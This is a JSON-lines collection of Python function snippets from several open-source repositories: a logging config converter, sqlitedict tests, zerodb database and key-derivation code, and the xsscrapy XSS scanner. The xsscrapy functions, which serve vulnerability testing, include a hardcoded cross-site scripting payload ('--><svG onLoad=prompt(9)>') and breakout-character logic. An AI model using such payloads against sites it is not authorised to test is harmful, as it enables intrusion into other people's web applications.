{"docstring": "\"\"\"Default converter for the cfg:// protocol.\"\"\"\n", "func_signal": "def cfg_convert(self, value):\n", "code": "rest = value\nm = self.WORD_PATTERN.match(rest)\nif m is None:\n    raise ValueError(\"Unable to convert %r\" % value)\nelse:\n    rest = rest[m.end():]\n    d = self.config[m.groups()[0]]\n    #print d, rest\n    while rest:\n        m = self.DOT_PATTERN.match(rest)\n        if m:\n            d = d[m.groups()[0]]\n        else:\n            m = self.INDEX_PATTERN.match(rest)\n            if m:\n                idx = m.groups()[0]\n                if not self.DIGIT_PATTERN.match(idx):\n                    d = d[idx]\n                else:\n                    try:\n                        n = int(idx) # try as number first (most likely)\n                        d = d[n]\n                    except TypeError:\n                        d = d[idx]\n        if m:\n            rest = rest[m.end():]\n        else:\n            raise ValueError('Unable to convert '\n                             '%r at %r' % (value, rest))\n#rest should be empty\nreturn d", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Re-opening of a database does not destroy it.\"\"\"\n# given,\n", "func_signal": "def test_default_reuse_existing_flag_c(self):\n", "code": "fname = norm_file('tests/db/sqlitedict-override-test.sqlite')\norig_db = SqliteDict(filename=fname)\norig_db['key'] = 'value'\norig_db.commit()\norig_db.close()\n\nnext_db = SqliteDict(filename=fname)\nself.assertIn('key', next_db.keys())\nself.assertEqual(next_db['key'], 'value')", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Verify SqliteDict.__str__().\"\"\"\n# given,\n", "func_signal": "def test_as_str(self):\n", "code": "db = SqliteDict()\n# exercise\ndb.__str__()\n# test when db closed\ndb.close()\ndb.__str__()", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "# exercise,\n", "func_signal": "def test_terminate_cannot_delete(self):\n", "code": "self.db.terminate()  # deletion failed, but no exception raised!\n\n# verify,\nos.chmod(os.path.dirname(self.fname), 0o700)\nos.chmod(self.fname, 0o600)\nself.assertTrue(os.path.exists(self.fname))", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' make terminate() instead of close()\n'''\n", "func_signal": "def test_terminate_instead_close(self):\n", "code": "d = sqlitedict.open('tests/db/sqlitedict-terminate.sqlite')\nd['abc'] = 'def'\nd.commit()\nself.assertEqual(d['abc'], 'def')\nd.terminate()\nself.assertFalse(os.path.isfile('tests/db/sqlitedict-terminate.sqlite'))", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Coverage for non-blocking commit.\"\"\"\n# given,\n", "func_signal": "def test_commit_nonblocking(self):\n", "code": "with SqliteDict(autocommit=True) as d:\n    # exercise: the implicit commit is nonblocking\n    d['key'] = 'value'\n    d.commit(blocking=False)", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_update_records\n'''\n", "func_signal": "def test_update_records(self):\n", "code": "self.d.update([('v', 'w')], p='x', q='y', r='z')\nself.assertEqual(len(self.d), 4)\n# As far as I know dicts does not need to return\n# the elements in a specified order (sort() is required )\nself.assertEqual(sorted(self.d.items()), sorted([('q', 'y'), ('p', 'x'), ('r', 'z'), ('v', 'w')]))\nself.assertEqual(sorted(list(self.d)), sorted(['q', 'p', 'r', 'v']))", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "# remove our monkeypatch\n", "func_signal": "def tearDown(self):\n", "code": "sys.version_info = self._orig_version_info\nif self.orig_sqlitedict:\n    sys.modules['sqlitedict'] = self.orig_sqlitedict", "path": "sqlitedict/tests/test_onimport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "# manually monkeypatch sys.version_info\n", "func_signal": "def setUp(self):\n", "code": "self._orig_version_info = sys.version_info\nsys.version_info = (2, 4, 0, 'does-not-matter', 0)\nself.orig_sqlitedict = sys.modules.pop('sqlitedict', None)", "path": "sqlitedict/tests/test_onimport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_manage_one_record\n'''\n", "func_signal": "def test_manage_one_record(self):\n", "code": "self.d['abc'] = 'rsvp' * 100\nself.assertEqual(self.d['abc'], 'rsvp' * 100)\nself.d['abc'] = 'lmno'\nself.assertEqual(self.d['abc'], 'lmno')\nself.assertEqual(len(self.d), 1)\ndel self.d['abc']\nself.assertEqual(len(self.d), 0)\nself.assertTrue(not self.d)", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Verify using a contextmanager that a connection can be reopened.\"\"\"\n", "func_signal": "def test_reopen_conn(self):\n", "code": "fname = norm_file('tests/db/sqlitedict-override-test.sqlite')\ndb = SqliteDict(filename=fname)\nwith db:\n    db['key'] = 'value'\n    db.commit()\nwith db:\n    db['key'] = 'value'\n    db.commit()", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Verify SqliteDict.__repr__().\"\"\"\n# given,\n", "func_signal": "def test_as_repr(self):\n", "code": "db = SqliteDict()\n# exercise\ndb.__repr__()", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_handling_errors\n'''\n", "func_signal": "def test_handling_errors(self):\n", "code": "def get_value(d, k):\n    return d[k]\n\ndef remove_nonexists(d, k):\n    del d[k]\n\nwith self.assertRaises(KeyError):\n    remove_nonexists(self.d, 'abc')\nwith self.assertRaises(KeyError):\n    get_value(self.d, 'abc')", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "# exercise,\n", "func_signal": "def test_cpickle_fallback_to_pickle(self):\n", "code": "sqlitedict = __import__(\"sqlitedict\")\n# verify,\nself.assertIn('pickle', sys.modules.keys())\nself.assertIs(sqlitedict.dumps, sys.modules['pickle'].dumps)", "path": "sqlitedict/tests/test_onimport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_manage_few_records\n'''\n", "func_signal": "def test_manage_few_records(self):\n", "code": "self.d['abc'] = 'lmno'\nself.d['xyz'] = 'pdq'\nself.assertEqual(len(self.d), 2)\nif major_version == 2:\n    self.assertEqual(list(self.d.iteritems()), [('abc', 'lmno'), ('xyz', 'pdq')])\nself.assertEqual(list(self.d.items()), [('abc', 'lmno'), ('xyz', 'pdq')])\nself.assertEqual(list(self.d.values()), ['lmno', 'pdq'])\nself.assertEqual(list(self.d.keys()), ['abc', 'xyz'])\nself.assertEqual(list(self.d), ['abc', 'xyz'])", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_create_sqlitedict\n'''\n", "func_signal": "def test_create_sqlitedict(self):\n", "code": "self.assertIsInstance(self.d, sqlitedict.SqliteDict)\nself.assertEqual(dict(self.d), {})\nself.assertEqual(list(self.d), [])\nself.assertEqual(len(self.d), 0)", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Irregular table names need to be quoted\"\"\"\n", "func_signal": "def test_irregular_tablenames(self):\n", "code": "def __test_irregular_tablenames(tablename):\n    filename = ':memory:'\n    db = SqliteDict(filename, tablename=tablename)\n    db['key'] = 'value'\n    db.commit()\n    self.assertEqual(db['key'], 'value')\n    db.close()\n\n__test_irregular_tablenames('9nine')\n__test_irregular_tablenames('outer space')\n__test_irregular_tablenames('table with a \"quoted\" name')\n__test_irregular_tablenames(\"table with a \\\"quoted \\xe1cute\\\" name\")", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Re-opening of a database with flag='c' destroys it all.\"\"\"\n# given,\n", "func_signal": "def test_overwrite_using_flag_n(self):\n", "code": "fname = norm_file('tests/db/sqlitedict-override-test.sqlite')\norig_db = SqliteDict(filename=fname, tablename='sometable')\norig_db['key'] = 'value'\norig_db.commit()\norig_db.close()\n\n# verify,\nnext_db = SqliteDict(filename=fname, tablename='sometable', flag='n')\nself.assertNotIn('key', next_db.keys())", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Re-opening of a database with flag='w' destroys only the target table.\"\"\"\n# given,\n", "func_signal": "def test_overwrite_using_flag_w(self):\n", "code": "fname = norm_file('tests/db/sqlitedict-override-test.sqlite')\norig_db_1 = SqliteDict(filename=fname, tablename='one')\norig_db_1['key'] = 'value'\norig_db_1.commit()\norig_db_1.close()\n\norig_db_2 = SqliteDict(filename=fname, tablename='two')\norig_db_2['key'] = 'value'\norig_db_2.commit()\norig_db_2.close()\n\n# verify, when re-opening table space 'one' with flag='2', we destroy\n# its contents.  However, when re-opening table space 'two' with\n# default flag='r', its contents remain.\nnext_db_1 = SqliteDict(filename=fname, tablename='one', flag='w')\nself.assertNotIn('key', next_db_1.keys())\n\nnext_db_2 = SqliteDict(filename=fname, tablename='two')\nself.assertIn('key', next_db_2.keys())", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\"Verify using sqlitedict as a contextmanager . \"\"\"\n", "func_signal": "def test_with_statement(self):\n", "code": "with SqliteDict() as d:\n    self.assertTrue(isinstance(d, SqliteDict))\n    self.assertEqual(dict(d), {})\n    self.assertEqual(list(d), [])\n    self.assertEqual(len(d), 0)", "path": "sqlitedict/tests/test_core.py", "commit_date": "2020-07-06 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "''' test_assign_values\n'''\n", "func_signal": "def test_assign_values(self):\n", "code": "self.d['abc'] = 'edf'\nself.assertEqual(self.d['abc'], 'edf')\nself.assertEqual(len(self.d), 1)", "path": "sqlitedict/tests/test_temp_db.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "piskvorky/sqlitedict", "stars": 1105, "license": "apache-2.0", "language": "python", "size": 253}
{"docstring": "\"\"\" Visually appealing output showing first 5 elements of the data \"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "first_el = self[:6]\nis_long = len(first_el) > 5\nreprs = [i.__repr__() for i in first_el[:5]]\nif is_long:\n    reprs.append(\"...\")\nif len(reprs) <= 1:\n    return \"[\" + \"\".join(reprs) + \"]\"\nelse:\n    l = len(reprs)\n    out = []\n    for i, s in enumerate(reprs):\n        if i == 0:\n            s = \"[\" + s\n        else:\n            s = \" \" + s\n        if i == l - 1:\n            s = s + \"]\"\n        else:\n            s = s + \",\"\n        out.append(s)\n    return \"\\n\".join(out)", "path": "zerodb/zerodb/util/iter.py", "commit_date": "2016-03-04 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"Opens db connection and registers a destuction callback\"\"\"\n\n", "func_signal": "def _conn_open(self):\n", "code": "self.__thread_local.conn = conn = self._db.open()\n\ndef destructor(conn_id):\n    conn = self._db.pool.all.data.get(conn_id, None)\n    if conn:\n        # Hack to make it not closing TM which is already removed\n        conn.opened = 0\n        conn.close()\n\nself.__thread_watcher.watch(destructor, id(conn))", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nKey is derived from SSL key_file.\nPassword is securely hashed if given at all\n\"\"\"\n", "func_signal": "def key_from_cert(username, password, key_file, cert_file, appname, key):\n", "code": "with open(key_file) as f:\n    key = hashlib.sha256(f.read().encode()).digest()\n\nif password is not None:\n    salt = \"|\".join([username, appname, 'key'])\n    password = scrypt.hash(password, salt, **scrypt_kw)\n    password = hashlib.sha256(password + b'auth').digest()\n\nreturn password, key", "path": "zerodb/zerodb/crypto/kdf.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nPassword is hashed, encryption key is left untouched.\nPassword is compatible with other functions\n\"\"\"\n", "func_signal": "def hash_password(username, password, key_file, cert_file, appname, key):\n", "code": "if password:\n    salt = \"|\".join([username, appname, 'key'])\n    password = scrypt.hash(password, salt, **scrypt_kw)\n    password = hashlib.sha256(password + b'auth').digest()\n\nreturn password, key", "path": "zerodb/zerodb/crypto/kdf.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nSmart proxy to catalog's query.\nOne can add <field=...> keyword arguments to make queries where fields\nare equal to specified values\n\n:param zerodb.catalog.query.Query queryobj: Query which all sorts of\n    logical, range queries etc\n:param int skip: Offset to start the result iteration from\n:param int limit: Limit number of results to this\n\"\"\"\n# Catalog's query returns only integers\n# We must be smart here and return objects\n# But no, we must be even smarter and batch-preload objects\n# Most difficult part is preloading TreeSets for index when needed\n# (when we do complex queries which require composite index)\n# We also probably should do something like lazy query(...)[ofs:...]\n# if no limit, skip are used\n\n# Work needed on skip and limit because zope didn't well support them...\n", "func_signal": "def query(self, queryobj=None, skip=None, limit=None, prefetch=True, **kw):\n", "code": "skip = skip or 0\nif limit:\n    kw[\"limit\"] = skip + limit\n\neq_args = []\nfor k in list(kw.keys()):\n    if k not in set([\"sort_index\", \"sort_type\", \"reverse\", \"names\", \"limit\"]):\n        eq_args.append(Eq(k, kw.pop(k)))\n\nif queryobj:\n    Q = optimize(optimize(queryobj) & And(*eq_args))\nelse:\n    Q = And(*eq_args)\n\nq = lambda: self._catalog.query(Q, **kw)\n\nif limit:\n    _, q = q()\n    # XXX islice -> [:]\n    qids = list(itertools.islice(q, skip, skip + limit))\n    objects = [self._objects[uid] for uid in qids]\n    if objects and prefetch:\n        self._db._connection.prefetch(objects)\n    for obj, uid in izip(objects, qids):\n        obj._p_uid = uid\n    return objects\n\nelse:\n    db_list = DBListPrefetch if prefetch else DBList\n    return db_list(q, self)", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nAdd newly created a Model object to the database\nStores *and* indexes it\n\n:param zerodb.models.Model obj: Object to add to the database\n:return: Added object's uid\n:rtype: int\n\"\"\"\n", "func_signal": "def add(self, obj):\n", "code": "if isinstance(obj, (list, set, tuple)):\n    return [self[o.__class__].add(o) for o in obj]\nelse:\n    return self[obj.__class__].add(obj)", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nMakes a sliceable, cached list-like interface to an iterator\n:param callable f: Function which inits the iterator\n\"\"\"\n", "func_signal": "def __init__(self, f, cache_size=1000, length=None):\n", "code": "self.f = f\nself.cache = LRUCache(cache_size)\nself.stop = 0\nself.length = length\nself.iterator = iter(f())", "path": "zerodb/zerodb/util/iter.py", "commit_date": "2016-03-04 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "# Initially, the root object is empty:\n", "func_signal": "def test_root_encryption(db):\n", "code": "_gsm = getGlobalSiteManager()\nutility = _gsm.getUtility(IEncrypter)\nedata, _ = db._storage.base.load(db._db._root_oid)\nassert get_encryption_signature(edata) == utility.name\nfor obj in db._root.values():\n    edata, _ = db._storage.base.load(obj._p_oid)\n    assert get_encryption_signature(edata) == b\"\"", "path": "zerodb/tests/test_root_encryption.py", "commit_date": "2016-07-26 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\n:param zerodb.DB db: Database to link model to\n:param model: Data model (subclass of zerodb.models.Model)\n\"\"\"\n", "func_signal": "def __init__(self, db, model):\n", "code": "self._model = model\nself._db = db\nself._catalog_name = \"catalog__\" + model.__modelname__\nself._intid_name = \"store__\" + model.__modelname__\nif not transaction.manager._txn and \\\n        (self._intid_name not in db._root or self._catalog_name not in db._root):\n    transaction.begin()\n    commit = True\nelse:\n    commit = False\n\nif self._intid_name not in db._root:\n    _objects = model.create_store()\n    db._root[self._intid_name] = _objects\n\nif self._catalog_name not in db._root:\n    _catalog = model.create_catalog()\n    db._root[self._catalog_name] = _catalog\n\nif commit:\n    transaction.commit()", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "# XXX Or query can be done lazily using heapq's sorted join\n", "func_signal": "def _apply(self, catalog, names):\n", "code": "IF = self.family.IF\nqueries = self.queries\nresult = queries[0]._apply(catalog, names)\nfor q in queries[1:]:\n    next_result = q._apply(catalog, names)\n    if len(result) == 0:\n        result = next_result\n    elif len(next_result) > 0:\n        _, result = self.family.IF.weightedUnion(_to_set(IF, result), _to_set(IF, next_result))\nreturn result", "path": "zerodb/zerodb/catalog/query.py", "commit_date": "2016-03-12 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"Access database root for this user\"\"\"\n\n", "func_signal": "def _root(self):\n", "code": "if os.getpid() != self.__pid:\n    # If a new process spins up, we need to re-initialize everything\n    self.__pid = os.getpid()\n    self._init_db()\nelse:\n    # Open connections from the pool when new threads spin up\n    # Should be closed when old thread-locals get garbage collected\n    if not hasattr(self.__thread_local, \"conn\") or\\\n            self.__thread_local.conn.opened is None:\n        self._conn_open()\n\nreturn self.__thread_local.conn.root()", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nRemove existing object from the database + unindex it\n\n:param zerodb.models.Model obj: Object to add to the database\n\"\"\"\n", "func_signal": "def remove(self, obj):\n", "code": "if isinstance(obj, six.integer_types):\n    uid = obj\nelif hasattr(obj, \"__iter__\"):\n    ctr = 0\n    for i in list(obj):\n        self.remove(i)\n        ctr += 1\n    return ctr\nelse:\n    assert obj.__class__ == self._model\n    uid = obj._p_uid\nself._catalog.unindex_doc(uid)\ndel self._objects[uid]\nreturn 1", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nGuess which function to use from values arguments\n\"\"\"\n", "func_signal": "def guess(username, password, key_file, cert_file, appname, key):\n", "code": "if key is None:\n    if password is not None:\n        return key_from_password\n    elif key_file is not None:\n        return key_from_cert\n    else:\n        raise AttributeError(\"Not enough attributes to guess KDF\")\n\nelse:\n    return hash_password", "path": "zerodb/zerodb/crypto/kdf.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "# XXX figure out doing smallest part first for performance\n", "func_signal": "def _apply(self, catalog, names):\n", "code": "IF = self.family.IF\nqueries = self.queries\nresult = queries[0]._apply(catalog, names)\nfor q in queries[1:]:\n    if len(result) == 0:\n        return IF.Set()\n    next_result = q._apply(catalog, names)\n    if len(next_result) == 0:\n        return IF.Set()\n    _, result = IF.weightedIntersection(_to_set(IF, result), _to_set(IF, next_result))\nreturn result", "path": "zerodb/zerodb/catalog/query.py", "commit_date": "2016-03-12 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nEnable or disable auto reindex\n\"\"\"\n", "func_signal": "def enableAutoReindex(self, enabled=True):\n", "code": "if enabled:\n    subscribers.init()\nself._reindex_queue_processor.enabled = enabled", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nRemove existing object from the database + unindex it\n\n:param zerodb.models.Model obj: Object to add to the database\n\"\"\"\n", "func_signal": "def remove(self, obj):\n", "code": "if isinstance(obj, models.Model):\n    self[obj.__class__].remove(obj)\n    return 1\nelif hasattr(obj, \"__iter__\"):\n    ctr = 0\n    for o in obj:\n        ctr += 1\n        self[o.__class__].remove(o)\n    return ctr\nelse:\n    raise ModelException(\"Class <%s> is not a Model or iterable\" % obj.__class__.__name__)", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nReindex one or multiple objects in the database\n\n:param obj: Object to add to the database or its uid, or list of objects or uids\n:type obj: zerodb.models.Model, list\n:param attributes: Attributes of obj to be reindex\n:type attributes: tuple, list\n\"\"\"\n", "func_signal": "def reindex(self, obj, attributes=None):\n", "code": "if isinstance(obj, models.Model):\n    self[obj.__class__].reindex_one(obj, attributes)\nelif isinstance(obj, (list, tuple, set, Sliceable)):\n    for o in obj:\n        assert isinstance(o, models.Model)\n        self[o.__class__].reindex_one(o, attributes)\nelse:\n    raise TypeError(\"ZeroDB object or list of these should be passed\")", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nDbModels (which we query) are accessed by using db as a dictionary\n\n:param model: Subclass of zerodb.models.Model to return or create db entry for\n:rtype: zerodb.db.DbModel\n\"\"\"\n# TODO implement list of keys, writing to arbitrary (new) dbmodel (which is not defined)\n", "func_signal": "def __getitem__(self, model):\n", "code": "if not issubclass(model, models.Model):\n    raise ModelException(\"Class <%s> is not a Model\" % model.__name__)\nif model not in self._models:\n    self._models[model] = DbModel(self, model)\nreturn self._models[model]", "path": "zerodb/zerodb/db.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\n:param function query_f: Function which returns results of the query in format (size, uids)\n:param zerodb.DB db: Currend DB instance\n\"\"\"\n", "func_signal": "def __init__(self, query_f, db, **kw):\n", "code": "self.db = db\n\ndef get_object(uid):\n    obj = db._objects[uid]\n    obj._p_uid = uid\n    return obj\n\ndef f():\n    self.length, it = query_f()\n    return imap(get_object, it)\n\nsuper(DBList, self).__init__(f, **kw)", "path": "zerodb/zerodb/util/iter.py", "commit_date": "2016-03-04 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "\"\"\"\nKey is derived from password using scrypt\npassword is replaced with sha256(key) so that we cannot deduce key from\nauth info\n\"\"\"\n", "func_signal": "def key_from_password(username, password, key_file, cert_file, appname, key):\n", "code": "salt = \"|\".join([username, appname, 'key'])\nkey = scrypt.hash(password, salt, **scrypt_kw)\n# Calculate hash so that server cannot derive key from new_password\n# b'auth' is added so that we don't use hash(key) by mistake\nnew_password = hashlib.sha256(key + b'auth').digest()\nreturn new_password, key", "path": "zerodb/zerodb/crypto/kdf.py", "commit_date": "2016-07-31 00:00:00", "repo_name": "nucypher/zerodb", "stars": 1564, "license": "agpl-3.0", "language": "python", "size": 3390}
{"docstring": "''' lxml cannot determine the order of attrs which is important\nif we're using regex to find the location of the inj so this func\nfinds the accurate attr based on the regex match amongst a list of\nattrs of the same tag. This is for multi injections in single attr_val\nas well as multi injections in multiple attrs.'''\n\n# Going for process of elimination first\n", "func_signal": "def accurate_attr(self, tag, attrs_attrvals, match, line):\n", "code": "copy_attrs_attrvals = attrs_attrvals.copy()\nfor attr in attrs_attrvals:\n    if attr+'=' not in line and attr+' =' not in line:\n        copy_attrs_attrvals.pop(attr, None)\n\n# Keep doing research to find the accurate attr\nif len(copy_attrs_attrvals) > 1:\n    attr_places = {}\n    for attr in copy_attrs_attrvals:\n        attrs_found = [x.end() for x in re.finditer(attr+'\\s?=', line)]\n        attr_places[max(attrs_found)] = attr\n     # Get the attribute from the higher numbered key within attr_places\n    closest_attr = attr_places[max(attr_places)]\n    return {closest_attr:copy_attrs_attrvals[closest_attr]}\n\n# Found the accurate attr\nelse:\n    for attr in copy_attrs_attrvals:\n        return {attr:copy_attrs_attrvals[attr]}\n\nreturn {None:None}", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Unescape the various payload encodings (html and url encodings)'''\n", "func_signal": "def unescape_payload(self, payload):\n", "code": "if '%' in payload:\n    payload = urllib.unquote_plus(payload)\n    #if '%' in payload: # in case we ever add double url encoding like %2522 for dub quote\n    #    payload = urllib.unquote_plus(payload)\n# only html-encoded payloads will have & in them\npayload = HTMLParser.HTMLParser().unescape(payload)\n\nreturn payload", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "\"\"\"\nPull out just the unfiltered chars from the reflected chars\npayload = delim+fuzz+delim+;9\n\"\"\"\n\n", "func_signal": "def get_unfiltered_chars(self, payload, ref_payload, delim, tag, attr):\n", "code": "ref_chars = ref_payload.replace(delim, '').replace('9', '')\nfuzz_chars = payload.replace(delim, '').replace('9', '')\nremove_chars = set([])\nunfiltered_chars_list = []\n\nhtml_entities = ['&#39', '&quot;', '&lt;', '&gt;']\n# Remove html encoded entities\nfor entity in html_entities:\n    if entity in ref_chars:\n        ref_chars.replace(entity, '')\n\n#If injection is inside script tag, remove the escaped chars\nif tag == 'script' or attr in self.event_attributes():\n   ref_chars = ref_chars.replace(\"\\\\'\", \"\").replace('\\\\\"', '').replace('\\;', '').replace('\\\\>', '').replace('\\\\<', '').replace('\\\\/', '')\n\nfor c in fuzz_chars:\n    if c in ref_chars:\n        continue\n    else:\n        remove_chars.add(c)\n\nfor char in fuzz_chars:\n    if char not in remove_chars:\n        unfiltered_chars_list.append(char)\n\nunfiltered_chars = ''.join(unfiltered_chars_list)\n\nreturn unfiltered_chars", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Returns either None if no breakout chars were found\nor a list of sets of potential breakout characters '''\n\n", "func_signal": "def get_breakout_chars(self, injection, resp_url):\n", "code": "tag_index, tag, attr, attr_val, payload, unfiltered_chars, line = injection\npl_delim = payload[:6]\nfull_match = '%s.{0,85}?%s' % (pl_delim, pl_delim)\nline = re.sub(full_match, 'INJECTION', line)\n\nall_chars_payloads = {}\n\n# Comment injection\nif tag == '!--':\n    chars = ('>')\n    payload = '--><svG onLoad=prompt(9)>'\n    try:\n        all_chars_payloads[chars] += [payload]\n    except KeyError:\n        all_chars_payloads[chars] = [payload]\n\n# Attribute injection\nelif attr:\n    chars_payloads = self.attr_breakout(tag, attr, attr_val, pl_delim, line)\n    for k in chars_payloads:\n        try:\n            all_chars_payloads[k] += chars_payloads[k]\n        except KeyError:\n            all_chars_payloads[k] = chars_payloads[k]\n\n# Between tag injection\nelse:\n    chars_payloads = self.tag_breakout(tag, line)\n    for k in chars_payloads:\n        try:\n            all_chars_payloads[k] += chars_payloads[k]\n        except KeyError:\n            all_chars_payloads[k] = chars_payloads[k]\n\n# Dedupe the list of potential payloads\nfor chars in all_chars_payloads:\n    all_chars_payloads[chars] = list(set(all_chars_payloads[chars]))\n\nreturn all_chars_payloads", 